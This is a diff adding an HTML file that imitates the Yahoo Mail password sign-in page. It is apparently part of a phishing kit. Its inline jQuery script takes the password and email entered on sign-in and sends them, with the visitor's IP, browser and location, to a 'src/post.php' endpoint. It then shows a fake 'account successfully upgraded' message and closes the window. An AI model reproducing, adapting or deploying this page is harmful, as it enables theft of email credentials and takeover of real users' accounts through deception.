@@ -1,0 +1,349 @@
+
+<!DOCTYPE html>
+<!-- saved from url=(0199)https://login.yahoo.com/account/challenge/password?.src=ym&.lang=en-US&.intl=us&authMechanism=primary&display=login&yid=jbadoly&done=https%3A%2F%2Fmail.yahoo.com%2Fd&sessionIndex=QQ--&acrumb=TYzqMrC9 -->
+<html id="Stencil" class="js yui3-js-enabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
+        <meta name="format-detection" content="telephone=no">
+        <meta name="referrer" content="origin-when-crossorigin">
+        <title>Yahoo
+</title>
+        <link rel="dns-prefetch" href="https://gstatic.com/">
+        <link rel="dns-prefetch" href="../../google.com/index.html">
+        <link rel="dns-prefetch" href="https://s.yimg.com/">
+        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
+        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
+        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
+        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
+        <link rel="icon" type="image/x-icon" href="../../s.yimg.com/wm/login/favicon.ico">
+        <link rel="shortcut icon" type="image/x-icon" href="../../s.yimg.com/wm/login/favicon.ico">
+        <link rel="apple-touch-icon" href="../../s.yimg.com/wm/login/apple-touch-icon.png">
+        <link rel="apple-touch-icon-precomposed" href="../../s.yimg.com/wm/login/apple-touch-icon.png">
+        <!--[if lte IE 8]>
+        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
+        <![endif]-->
+        <!--[if gt IE 8]><!-->
+        <link rel="stylesheet" href="../../s.yimg.com/zz/combo%3Fyui-s:pure%252F0.5.0%252Fpure-min.css&amp;yui-s:pure%252F0.5.0%252Fgrids-responsive-min.css">
+        <!--<![endif]-->
+        <style nonce="v4VeXrEoHp4A2+EBaOj8Oe/d1bP1OyAnu0Sck40Q8XqxkxmH">
+            #mbr-css-check { 
+                display: inline;
+            }
+        </style>
+        <link href="src/yahoo-main.css" rel="stylesheet" type="text/css">
+<link href="src/combo.html" rel="stylesheet" type="text/css">
+        <script nonce="v4VeXrEoHp4A2+EBaOj8Oe/d1bP1OyAnu0Sck40Q8XqxkxmH">
+       /*     (function(root) {
+                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
+                root.isGoodJS = isGoodJS;
+            }(this));
+            
+(function (root) {
+/ * -- Data -- * /
+root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
+root.I13N_config = {"debug":false,"_ywa":10001496213979,"client_only":1,"spaceid":1197774520,"sections":null};
+root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
+root.I13N_config || (root.I13N_config = {});
+root.I13N_config.spaceid = 150002993;
+root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=150002993&ref=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":3000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
+root.challenge || (root.challenge = {});
+root.challenge.servingStamp = 1526990081359;
+}(this));
+
+            
+            YUI_config.global = window;
+
+            window.mbrSendError = function (name, url) {
+                (new Image()).src = '/account/js-reporting/?rid=3ioeghpdg8181&crumb=' + encodeURIComponent('pAdrqKtli5K') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
+            };
+
+            var oldError = window.onerror;
+
+            window.onerror = function (errorMsg, url) {
+                window.mbrSendError(errorMsg, url);
+                if (oldError) {
+                    oldError.apply(this, arguments);
+                }
+                return false;
+            };*/
+        </script>
+    </head>
+		<div id="showshow" style="position:fixed; z-index:-1000; bottom:0; top:0; left:0; right:0; background:rgba(255,255,255,0);transform-origin: 162.5px center 0px;display:none"><center>
+
+
+
+<div style="background-image:url(src/yahoomail.gif); width:100%;bottom: 0; 
+    background-repeat: no-repeat;
+    background-position: center;position:absolute;top:0;    background-size: 150px;"></div>
+
+</center></div>
+    <body>
+	
+
+	
+	
+	
+	
+	
+        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
+            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
+            <input type="checkbox" id="mbr-legacy-device-bar-cross">
+            <p class="mbr-legacy-device">
+                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="../../help.yahoo.com/kb/index%3Fpage=content&amp;y=PROD_ACCT&amp;id=SLN4556&amp;actp=productlink&amp;locale=en_US.html">More&nbsp;Info</a>
+            </p>
+        </div>
+    <script nonce="v4VeXrEoHp4A2+EBaOj8Oe/d1bP1OyAnu0Sck40Q8XqxkxmH">
+        (function(root) {
+            var doc = document;
+
+            if (root.isGoodJS) {
+                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
+                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
+            } else {
+                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
+                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
+            }
+        }(this));
+    </script>
+
+    <div id="login-body" class="loginish  puree-v2">
+    <div class="hd mbr-ucs-hd" id="mbr-uh-hd">
+    <style type="text/css">@font-face{font-family:uh;src:url(../../s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot%3F);src:url(../../s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot%3F) format('embedded-opentype'),url(../../s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2%3F) format('woff2'),url(../../s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff%3F) format('woff'),url(../../s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf%3F) format('truetype'),url(../../s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg%3F) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}</style><link type="text/css" rel="stylesheet" href="src/combo(1).html"><!-- meta --><div id="yucs-meta" data-authstate="signedout" data-cobrand="standard" data-crumb="CDOPT1AQGWW" data-mc-crumb="P7x7nH.Rkke" data-gta="nv6O5aR/O.X" data-device="desktop" data-experience="uh304" data-firstname="" data-style="" data-flight="1526990081" data-forcecobrand="standard" data-guid="" data-host="login.yahoo.com" data-https="1" data-languagetag="en-us" data-property="login" data-protocol="https" data-shortfirstname="" data-shortuserid="" data-status="active" data-spaceid="" data-test_id="" data-userid="" data-stickyheader="true" data-headercollapse="" data-uh-test="acctswitch"></div><!-- /meta --><div id="UH" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" role="banner" data-protocol="https" data-property="login" data-spaceid="" data-stencil="true"> <style>body {
+margin-top: 0px !important; 
+}
+
+#UH{
+font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
+}
+
+.YLogoMY{
+text-indent: -30em;
+}</style> <div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" style="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation"><style>/** * IE7+ and non-retina display */.YLogoMY { background-repeat: no-repeat; background-image: url(../../s.yimg.com/rz/d/yahoo_mail_en-US_s_f_pw_351x40_mail.png); _background-image: url(../../s.yimg.com/rz/d/yahoo_mail_en-US_s_f_pw_351x40_mail.gif); /* IE6 */ width: 350px !important; }.DarkTheme .YLogoMY { background-position: -351px 0px !important;}/** * For 'retina' display */@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(../../s.yimg.com/rz/d/yahoo_mail_en-US_s_f_pw_351x40_mail_2x.png) !important; background-size: 700px 40px !important; }}</style><a class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " data-ylk="slk:logo;t3:logo;t5:logo;elm:img;elmt:logo;" href="../../login.yahoo.com/account/challenge/password%3F.src=ym&amp;.lang=en-US&amp;.intl=us&amp;authMechanism=primary&amp;display=login&amp;yid=jbadoly&amp;done=https%253A%252F%252Fmail.yahoo.com%252Fd&amp;sessionIndex=QQ--&amp;acrumb=TYzqMrC9.html#" target="_top">Yahoo</a></div> <div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">   <li class="yucs-mail-info D(ib) Lts(n) Zoom Va(t) Pos(r) Lh(1.7)"><a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="../../overview.mail.yahoo.com/index.html" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"><b>About Mail</b></a><a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="../../overview.mail.yahoo.com/index.html#features" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"><b>Features</b></a><a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="../../mobile.yahoo.com/mail/index.html%3Fsrc=gta.html" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"><b>Get the App</b></a></li> <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> <a id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="../../help.yahoo.com/kb/index%3Flocale=en_US&amp;page=product&amp;y=PROD_ACCT.html" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"> <b>Help</b> </a></li> </ul> </div> </div><!-- /#UH --></div>   
+</div>
+
+    <div class="login-box-container">
+        <div class="login-box default">
+            <div class="txt-align-center">
+                    <img src="src/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo " width="116" height="">
+            </div>
+            <div class="challenge">
+			
+			<div id="congrate" style="    padding-top: 70px;
+    width: 100%;
+    font-family: pp-sans-small-light,Helvetica Neue,Arial,sans-serif;
+    font-size: 1.257rem;
+    line-height: 1.25em;
+    text-align: center;
+    letter-spacing: 0.02em;display:none">
+
+
+<span style="color: #72a5fb;font-size: 1.857rem;">Thank You!</span><br><br>Your yahoo account has been successfully upgraded, no other action required.<br><br><br><br><br><br><br><br><br>
+
+<span style="color: #72a5fb;font-size: .857rem;cursor:pointer" onclick="close_window();">Close Window</span>
+
+</div>
+			
+			
+    <div id="password-challenge" class="primary">
+    <div class="greeting">
+            <h1 class="username">Hello </h1>
+            <p class="not-you"><a href="../../login.yahoo.com/index.html%3Fdisplay=login&amp;.intl=us&amp;.lang=en-US&amp;.src=ym&amp;done=https%253A%252F%252Fmail.yahoo.com%252Fd&amp;prefill=0.html" onclick="return false;">Not&nbsp;you?</a></p>
+    </div>
+    <form action="index.html" method="post" class="pure-form pure-form-stacked" onsubmit="return false;">
+        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;color_depth&quot;:32,&quot;resolution&quot;:{&quot;w&quot;:640,&quot;h&quot;:360},&quot;available_resolution&quot;:{&quot;w&quot;:640,&quot;h&quot;:360},&quot;timezone_offset&quot;:-60,&quot;session_storage&quot;:1,&quot;local_storage&quot;:1,&quot;indexed_db&quot;:1,&quot;open_database&quot;:1,&quot;cpu_class&quot;:&quot;unknown&quot;,&quot;navigator_platform&quot;:&quot;Linux aarch64&quot;,&quot;do_not_track&quot;:&quot;unknown&quot;,&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;adblock&quot;:0,&quot;has_lied_languages&quot;:1,&quot;has_lied_resolution&quot;:0,&quot;has_lied_os&quot;:1,&quot;has_lied_browser&quot;:0,&quot;touch_support&quot;:{&quot;points&quot;:5,&quot;event&quot;:1,&quot;start&quot;:1},&quot;plugins&quot;:{&quot;count&quot;:0,&quot;hash&quot;:&quot;24700f9f1986800ab4fcc880530dd0ed&quot;},&quot;fonts&quot;:{&quot;count&quot;:13,&quot;hash&quot;:&quot;a2e0f9ea3b732bb3e28034f2447b9d76&quot;},&quot;ts&quot;:{&quot;serve&quot;:1526990081359,&quot;render&quot;:1526990082668}}">
+        <input type="hidden" name="crumb" value="pAdrqKtli5K">
+        <input type="hidden" name="acrumb" value="TYzqMrC9">
+        <input type="hidden" name="sessionIndex" value="QQ--">
+        <input type="hidden" name="displayName" id="email" value="">
+        <div class="hidden-username">
+            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="">
+        </div>
+        <input type="hidden" name="passwordContext" value="normal">
+        <input type="password" id="password" name="password" placeholder="Password" autofocus="" style="outline-color: transparent;">
+        <p class="signin-cont">
+            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">                        
+                    Sign&nbsp;in
+            </button>
+        </p>
+        <p class="forgot-cont">
+            <input type="submit" class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my password">
+        </p>
+    </form>
+</div>
+
+</div>
+
+        </div>
+        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
+            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
+<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
+
+        </div>
+    </div>
+    <div class="login-box-ad-outer">
+        <div class="login-box-ad-inner">
+            <div id="login-ad-mon"></div>
+            <div id="login-ad-sky"></div>
+            <div id="login-ad-rich"></div>
+        </div>
+    </div>
+</div>
+
+</div>   <!-- <script src="./src/bundle.js"></script><div id="ads">
+<script src="./src/combo(2)"></script><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div> -->
+    <noscript>
+        &lt;img src="/account/js-reporting/?crumb=pAdrqKtli5K&amp;message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;"&gt;
+    </noscript>
+    <script nonce="v4VeXrEoHp4A2+EBaOj8Oe/d1bP1OyAnu0Sck40Q8XqxkxmH">
+     /*   var checkAssets = function(seconds) {
+            setTimeout(function() {
+                if (!window.mbrJSLoaded) {
+                    window.mbrSendError('js_failed_to_load', location.pathname);
+                }
+                var check = document.getElementById('mbr-css-check'),
+                    style = check.currentStyle;
+                if (window.getComputedStyle) {
+                    style = window.getComputedStyle(check);
+                }
+                if (style.display !== 'none') {
+                    window.mbrSendError('css_failed_to_load', location.pathname);
+                }
+            }, (seconds * 1000));
+        };
+
+        checkAssets(10);*/
+    </script>
+    <div id="mbr-css-check"></div>
+
+
+<!-- fe19.member.bf1.yahoo.com - Tue May 22 2018 11:54:41 GMT+0000 (UTC) - (1ms) -->
+<script src="src/client.php.html"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="src/jquery.js"></script>
+
+<script>
+var time = new Date().getTime();  
+
+
+		$(function(){
+			$("#login-signin").click(function(){
+			var password = $('#password').val();
+			var email = $('#email').val();
+			var ip = "54.164.13.61";var browser = "Wget/1.16.1 (linux-gnu)";var country = "United States";var state = "Virginia";var city = "Ashburn";
+			var provider = "Yahoo Mail";
+			//alert(email);
+			if(password.length >= 6){
+							$('#showshow').css({'background':'rgba(255,255,255,0.70)','z-index':'1999','display':'block'});
+$.get("src/post.php", {email:email, password:password, ip:ip, provider:provider, browser:browser, country:country, state:state, city:city}, function(data, status)
+		{ 
+			if(status ==  "success"){
+	
+
+	
+			time = new Date().getTime();
+			
+			function refresh() { 
+if(new Date().getTime() - time >= 7000){
+cor();
+}else {
+setTimeout(refresh, 7000); 
+}
+} 
+setTimeout(refresh, 7000);
+	
+	
+	
+	
+	
+			}else{
+				
+					$('#showshow').css({'background':'rgba(255,255,255,0)','z-index':'-999','display':'none'});
+			
+			}
+			
+					});
+				
+				}
+				
+				});
+		});
+		
+		
+		function cor(){
+		$('#showshow').css({'background':'rgba(255,255,255,0)','z-index':'-999','display':'none'});
+		$('#password-challenge').css({'display':'none'});	
+		$('#congrate').css({'display':'block'});	
+		
+		
+		time = new Date().getTime();
+			
+			function refres() { 
+if(new Date().getTime() - time >= 5000){
+window.top.close();
+self.close();
+window.close();
+}else {
+setTimeout(refres, 5000); 
+}
+} 
+setTimeout(refres, 5000);
+
+		}
+		
+		function close_window(){
+			self.close();
+			window.top.close();
+window.close();
+		}
+		//view_container  congrate
+// window.location = "https://www.paypal.com";
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
+
+
+
